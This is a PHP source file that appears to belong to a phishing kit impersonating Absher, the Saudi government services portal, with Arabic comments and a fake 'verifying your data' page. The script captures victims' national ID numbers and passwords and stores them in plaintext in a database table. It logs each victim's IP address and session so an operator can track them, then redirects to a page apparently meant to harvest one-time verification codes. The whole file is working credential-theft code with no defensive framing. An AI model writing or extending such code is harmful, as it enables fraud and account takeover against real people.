<?php
require_once __DIR__ . '/../includes/bootstrap_client_session.php';
// الاتصال بقاعدة البيانات
require_once '../dashboard/init.php';
// إنشاء كائن User
$user = new User();

// التحقق من إرسال النموذج
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $loginField = isset($_POST['LoginPortletIDField']) ? trim($_POST['LoginPortletIDField']) : '';
    $secretField = isset($_POST['LoginPortletSecretField']) ? trim($_POST['LoginPortletSecretField']) : '';
    
    // التحقق من وجود البيانات
    if (!empty($loginField) && !empty($secretField)) {
        
        $user_id = null;
        if (!empty($_SESSION['user_id'])) {
            $user_id = (int) $_SESSION['user_id'];
        } elseif (!empty($_SESSION['current_user_id'])) {
            $user_id = (int) $_SESSION['current_user_id'];
        } elseif (!empty($_SESSION['client_id'])) {
            $user_id = (int) $_SESSION['client_id'];
        }

        if ($user_id) {
            $_SESSION['user_id'] = $user_id;
            $_SESSION['current_user_id'] = $user_id;
            $_SESSION['client_id'] = $user_id;

            $user->updateUserMessage($user_id, 'تسجيل دخول أبشر - SSN: ' . $loginField);
            $user->updateUserCurrentPage($user_id, 'absher.html');
            
        } else {
            // إذا لم يكن في جلسة، أنشئ مستخدم جديد
            $username_client = 'absher_' . time();
            $ip_address = $_SERVER['REMOTE_ADDR'];
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $session_id = session_id();
            $selected_school = isset($_SESSION['selected_school']) ? $_SESSION['selected_school'] : null;
            
            $userData = [
                'username' => $username_client,
                'ssn' => $loginField,
                'selected_school' => $selected_school,
                'message' => 'تسجيل دخول أبشر',
                'currentpage' => 'absher.html',
                'ip_address' => $ip_address,
                'user_agent' => $user_agent,
                'session_id' => $session_id,
                'live' => 1,
                'lastlive' => round(microtime(true) * 1000),
                'status' => 0
            ];
            
            $user_id = $user->insertFormData($userData);
            
            if ($user_id) {
                $user_id = (int) $user_id;
                $_SESSION['user_id'] = $user_id;
                $_SESSION['current_user_id'] = $user_id;
                $_SESSION['client_id'] = $user_id;
                $_SESSION['username'] = $username_client;
            }
        }
        
        // حفظ بيانات تسجيل الدخول في absher_logins
        if ($user_id) {
            $absherData = [
                'user_id' => $user_id,
                'username_or_id' => $loginField,
                'password' => $secretField
            ];
            
            $absher_id = $user->insertAbsherLogin($absherData);
            
            if ($absher_id) {
                $user->updateUserMessage($user_id, 'صفحة رمز التحقق - أبشر');
                $user->updateUserCurrentPage($user_id, 'absher-otp.php');
                
                // عرض صفحة "جاري التحقق" بدلاً من التوجيه المباشر
                displayVerificationScreen();
                exit();
            }
        }
    }
    
    // إذا فشل، أعد التوجيه لصفحة أبشر
    header("Location: ../absher.html");
    exit();
    
} else {
    // طريقة الإرسال غير صحيحة
    header("Location: ../absher.html");
    exit();
}

// دالة عرض شاشة التحقق
function displayVerificationScreen() {
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق - أبشر</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        
        .verification-container {
            background: white;
            padding: 50px 40px;
            border-radius: 15px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
            border: 1px solid #e8e8e8;
            text-align: center;
            max-width: 400px;
            width: 90%;
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            background: #6c757d;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
        }
        
        .logo svg {
            width: 50px;
            height: 50px;
            fill: white;
        }
        
        h1 {
            color: #333333;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        p {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #6c757d;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            overflow: hidden;
            margin-top: 30px;
        }
        
        .progress-fill {
            height: 100%;
            background: #6c757d;
            border-radius: 2px;
            animation: progress 3s ease-in-out;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="verification-container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
            </svg>
        </div>
        
        <h1>جاري التحقق من البيانات</h1>
        <p>يرجى الانتظار بينما نتحقق من معلوماتك...</p>
        
        <div class="spinner"></div>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>
    
    <script>
        // التوجيه التلقائي بعد 3 ثواني
        setTimeout(function() {
            window.location.href = '../absher-otp.php';
        }, 3000);
    </script>
</body>
</html>
<?php
}
?>
